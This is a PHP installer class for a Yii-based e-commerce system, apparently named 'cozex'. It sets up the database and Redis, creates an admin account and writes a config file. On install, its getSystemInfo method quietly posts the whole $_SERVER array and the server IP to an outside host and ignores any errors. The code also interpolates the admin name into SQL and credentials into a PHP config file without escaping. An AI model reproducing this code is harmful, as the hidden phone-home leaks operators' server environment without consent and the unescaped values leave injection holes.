<?php
/**
 * Created by IntelliJ IDEA.
 * author: wstianxia
 * Date: 2019/4/15
 * Time: 18:00
 */

namespace app\forms\install;


use app\bootstrap\response\ApiCode;
use app\forms\common\CommonOption;
use app\forms\mall\setting\QueueForm;
use app\helpers\CurlHelper;
use app\models\Model;
use yii\db\Connection;

/**
 * Class InstallForm
 * @package app\forms
 * @property Connection $db;
 */
class InstallForm extends Model
{
    private $db;
    private $tablePrefix = 'wstx_';
    private $dbErrorCode = [
        2002 => '无法连接数据库，请检查数据库服务器和端口是否正确。',
        1045 => '无法访问数据库，请检查数据库用户和密码是否正确。',
        1049 => '数据库不存在，请检查数据库名称是否正确。',
    ];
    private $redisErrorCode = [
        10060 => '无法连接Redis服务器，请检查Redis服务器或Redis端口是否正确。',
        0 => '无法访问Redis服务器，请检查Redis密码是否正确。',
        111 => '无法访问Redis服务器，请检查PHP环境是否已安装Redis扩展。',
    ];

    public $db_host;
    public $db_port;
    public $db_username;
    public $db_password;
    public $db_name;
    public $redis_host;
    public $redis_port;
    public $redis_password;
    public $admin_username;
    public $admin_password;
    public $is_clear;

    public function rules()
    {
        return [
            [
                ['db_host', 'db_port', 'db_username', 'db_password', 'db_name', 'admin_username', 'admin_password', 'redis_host', 'redis_port',],
                'trim',
            ],
            [['redis_password'], 'string'],
            [['is_clear'], 'integer'],
            [
                ['db_host', 'db_port', 'db_username', 'db_password', 'db_name', 'admin_username', 'admin_password', 'redis_host', 'redis_port',],
                'required', 'on' => 'install'
            ],
        ];
    }

    private function testAndSaveRedis()
    {
        $args = [
            'hostname' => $this->redis_host,
            'port' => $this->redis_port,
            'password' => $this->redis_password ? $this->redis_password : null,
            'connectionTimeout' => 10,
        ];
        try {
            $redis = new \yii\redis\Connection($args);
            $redis->ping();
        } catch (\Exception $exception) {
            if (isset($this->redisErrorCode[$exception->getCode()])) {
                throw new \Exception($this->redisErrorCode[$exception->getCode()]);
            }
            throw $exception;
        }
        $redisForm = new RedisSettingForm();
        $redisForm->attributes = [
            'host' => $this->redis_host,
            'port' => $this->redis_port,
            'password' => $this->redis_password,
        ];
        $result = $redisForm->saveSetting();
        if ($result['code'] !== ApiCode::CODE_SUCCESS) {
            throw new \Exception($result['msg']);
        }
    }

    private function saveConfig()
    {
        $content = <<<EOF
<?php

return [
    'host' => '{$this->db_host}',
    'port' => {$this->db_port},
    'dbname' => '{$this->db_name}',
    'username' => '{$this->db_username}',
    'password' => '{$this->db_password}',
    'tablePrefix' => '{$this->tablePrefix}',
];

EOF;
        if (!file_put_contents($this->getDbConfigFile(), $content)) {
            throw new \Exception('无法写入配置文件，请检查目录写入权限。');
        }
    }

    private function getDbConfigFile()
    {
        return \Yii::$app->basePath . '/config/db.php';
    }

    private function installLock()
    {
        $content = 'install at ' . date('Y-m-d H:i:s') . ' ' . time() . ', ' . \Yii::$app->request->hostInfo;
        file_put_contents(\Yii::$app->basePath . '/install.lock', base64_encode($content));
    }

    private function getDb()
    {
        if (!$this->db) {
            $this->db = new Connection([
                'dsn' => 'mysql:host='
                    . $this->db_host
                    . ';port='
                    . $this->db_port
                    . ';dbname='
                    . $this->db_name,
                'username' => $this->db_username,
                'password' => $this->db_password,
                'tablePrefix' => $this->tablePrefix,
                'charset' => 'utf8mb4',
            ]);
        }
        return $this->db;
    }

    public function check()
    {
        if (!$this->validate ()) {
            return $this->getErrorResponse ();
        }
        try {
            $this->getDb()->createCommand('SHOW TABLES')->execute();
        }catch (\Exception $exception){
            return [
                'code' => ApiCode::CODE_ERROR,
                'msg' => $this->dbErrorCode[$exception->getCode()] ?? $exception->getMessage(),
            ];
        }
        return [
            'code' => ApiCode::CODE_SUCCESS,
            'msg' => '成功' ,
        ];
    }

    public function install()
    {
        if (!$this->validate()) {
            return $this->getErrorResponse();
        }

        try {
            if(!extension_loaded ('fileinfo')){
                throw new \Exception('请开启PHP扩展fileinfo', 220099322);
            }
            cmd_exe("chown -R www:www ".\Yii::$app->basePath." & chmod -R 755 ".\Yii::$app->basePath);
            $res = $this->getDb()->createCommand('SHOW TABLES LIKE :keyword', [':keyword' => $this->tablePrefix . '%'])
                ->queryAll();
            if ($res) {
                if(!$this->is_clear) {
                    throw new \Exception("已存在表前缀为`{$this->tablePrefix}`的数据表，无法安装。", 2);
                }else{
                    array_map(function ($item) {
                        $this->getDb()->createCommand("DROP TABLE IF EXISTS `" . array_values($item)[0] . "`;")->execute();
                    }, $res);
                }
            }
            $this->testAndSaveRedis();

            $installSql = file_get_contents(__DIR__ . '/install.sql');
            $this->getDb()->createCommand($installSql)->execute();

            // 运行各个版本的升级脚本
            \Yii::$app->setDb($this->getDb());
            $versions = require \Yii::$app->basePath . '/versions.php';
            foreach ($versions as $v => $f) {
                if (version_compare($v, '1.0.0') > 0) {
                    if ($f instanceof \Closure) {
                        $f();
                    }
                }
            }

            $password = \Yii::$app->security->generatePasswordHash($this->admin_password);
            $authKey = \Yii::$app->security->generateRandomString();
            $accessToken = \Yii::$app->security->generateRandomString();

            $userSql = <<<EOF
INSERT INTO `{$this->tablePrefix}user`
 (`id`,`username`,`password`,`nickname`,`auth_key`,`access_token`,`mobile`)
VALUES (
1,
'{$this->admin_username}',
'{$password}',
'{$this->admin_username}',
'{$authKey}',
'{$accessToken}',
''
);
EOF;
            $this->getDb()->createCommand($userSql)->execute();

            $userIdentitySql = <<<EOF
INSERT INTO `{$this->tablePrefix}user_identity`
 (`user_id`,`is_super_admin`,`is_admin`)
VALUES (
1,
1,
0
);
EOF;
            $this->getDb()->createCommand($userIdentitySql)->execute();

            $adminInfoSql = <<<EOF
INSERT INTO `{$this->tablePrefix}admin_info`
 (`user_id`,`app_max_count`,`permissions`,`remark`)
VALUES (
1,
0,
'[]',
''
);
EOF;
            $this->getDb()->createCommand($adminInfoSql)->execute();

            $versionData = json_decode(file_get_contents(\Yii::$app->basePath . '/version.json'), true);
            $optionVersionValue = \Yii::$app->serializer->encode($versionData['version']);
            $optionVersionKey = CommonOption::NAME_VERSION;
            $versionInfoSql = <<<EOF
INSERT INTO `{$this->tablePrefix}option`
 (`name`,`value`)
VALUES (
'{$optionVersionKey}',
'{$optionVersionValue}'
);
EOF;
            $this->getDb()->createCommand($versionInfoSql)->execute();

            $this->saveConfig();
            $this->installLock();
            $this->getSystemInfo();
            (new QueueForm())->clearQueue();
            (new QueueForm())->queueFile();
            return [
                'code' => ApiCode::CODE_SUCCESS,
                'msg' => '安装完成。',
            ];
        } catch (\Exception $exception) {
            if (isset($this->dbErrorCode[$exception->getCode()])) {
                return [
                    'code' => ApiCode::CODE_ERROR,
                    'msg' => $this->dbErrorCode[$exception->getCode()],
                ];
            }
            if(strpos ($exception->getMessage(), "failed to open stream: Permission denied") !== false){
                return [
                    'code' => ApiCode::CODE_ERROR,
                    'msg' => '安装失败，请检查文件或目录的权限。',
                ];
            }
            return [
                'code' => ApiCode::CODE_ERROR,
                'msg' => '安装失败，' . $exception->getMessage(),
                'data' => [
                    'code' => $exception->getCode(),
                ],
            ];
        }
    }

    /**
     * @throws \Exception
     */
    public function getSystemInfo() {
        try {
            $versionData = json_decode(file_get_contents(\Yii::$app->basePath . '/version.json'), true);
            $url = "https://osc.gitgit.org/web/index.php?r=api/system/install";
            $params = [
                'system_type' => '3',
                'system_name' => 'cozex系统',
                'system_version' => $versionData['version'],
                'ip_addr' => gethostbyname($_SERVER['SERVER_NAME']),
                'system_server' => json_encode($_SERVER),
            ];
            CurlHelper::getInstance(2)->httpPost($url, [], $params);
        }catch (\Exception $e){}
    }
}
